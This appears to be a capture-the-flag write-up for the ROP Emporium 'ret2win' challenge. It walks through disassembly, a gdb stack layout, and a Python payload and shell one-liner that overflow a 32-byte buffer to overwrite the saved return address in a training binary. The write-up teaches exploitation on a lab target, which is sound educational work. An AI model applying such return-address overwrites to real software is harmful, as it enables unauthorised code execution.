---
title: 01_ret2win
categories: [series, rop_emporium]
---

# ROP Emporium ret2win

* **Tools:** IDA Free 7.0, gdb-gef, checksec
* **Prerequistes:** Stack frame
* **Download solution:** [main.py](/assets/series/rop_emporium/main.py)

## Overview

> "[...] there is a magic method we want to call and we'll do so by overwriting a saved return address on the stack. [...]"

As stated by the author, this first challenge exists for us to discover the joys of overwriting a return address. The tool _checksec_ confirms this as there is no stack canary:

Protection | Status
---------- |-------
relro | partial
**canary** | **no**
nx | yes
pie | no
rpath | no
runpath | no
fortify_source | no
fortified | 0
fortify-able | 6

We want to reach function `ret2win()`, found at address `0x400811`.

## Function pwnme()

Everything occurs within the function `pwnme()`. First, it sets the stack frame (32 bytes):
```
00000000004007B5    push    rbp
00000000004007B6    mov     rbp, rsp
00000000004007B9    sub     rsp, 20h ; 32 bytes
```
Then, it clears the 32 bytes buffer that will contains input from the user:
```
00000000004007BD    lea     rax, [rbp+s]
00000000004007C1    mov     edx, 20h        ; n
00000000004007C6    mov     esi, 0          ; c
00000000004007CB    mov     rdi, rax        ; s
00000000004007CE    call    _memset
```
Finally, get user input:
```
00000000004007F6    mov     rdx, cs:stdin@@GLIBC_2_2_5 ; stream
00000000004007FD    lea     rax, [rbp+s]
0000000000400801    mov     esi, 32h        ; n = 50 bytes
0000000000400806    mov     rdi, rax        ; s
0000000000400809    call    _fgets
```
Loading the binary in gdb and putting a breakpoint at `0x400809`, we have the following stack frame before the call to `_fgets()` (`RSP` and `RBP` values can vary on your machine):
```
0x7fffffffe1e0: 0x0000000000000000  <-+ buffer start
0x7fffffffe1e8: 0x0000000000000000    |
0x7fffffffe1f0: 0x0000000000000000    |
0x7fffffffe1f8: 0x0000000000000000  <-+ buffer end
0x7fffffffe200: 0x00007fffffffe210  <-- saved RBP
0x7fffffffe208: 0x00000000004007a4  <-- saved RIP
```
So, to reach the function `ret2win()` all we have to do is to provide an input long enough to overwrite the saved return address (saved `RIP`) with the correct address. Here the function `ret2win()` is at address `0x400811`.

## Exploiting the function

Here is the raw payload in Python:
```python
payload = b''
payload += b'\x41\x41\x41\x41\x41\x41\x41\x41' # buffer
payload += b'\x41\x41\x41\x41\x41\x41\x41\x41' # buffer
payload += b'\x41\x41\x41\x41\x41\x41\x41\x41' # buffer
payload += b'\x41\x41\x41\x41\x41\x41\x41\x41' # buffer
payload += b'\x42\x42\x42\x42\x42\x42\x42\x42' # RBP
payload += b'\x11\x08\x40\x00\x00\x00\x00\x00' # RIP
```
To send it via the command line:
```bash
python -c 'print("\x41"*0x20+"\x42"*8+"\x11\x08\x40\x00\x00\x00\x00\x00")' | ./ret2win
```
Where:
* The original buffer is filled with 32 `A` characters;
* The original RBP is overwritten with 8 `B` characters;
* The original RIP is overwritten with `0000000000400811`.

Stack frame after `_fgets()`:
```vim
0x00007fffffffe1e0: 0x4141414141414141  <-+ buffer start
0x00007fffffffe1e8: 0x4141414141414141    |
0x00007fffffffe1f0: 0x4141414141414141    |
0x00007fffffffe1f8: 0x4141414141414141  <-+ buffer end
0x00007fffffffe200: 0x4242424242424242  <-- overwritten RBP
0x00007fffffffe208: 0x0000000000400811  <-- <ret2win+0>
```
It seems OK, but:
```
> Thank you! Here's your flag:ROPE{a_placeholder_32byte_flag!}
Segmentation fault
```
This input is enough to reach the function we want to get executed. However, we mess with `RBP` and end up with a segfault.

---
EOF
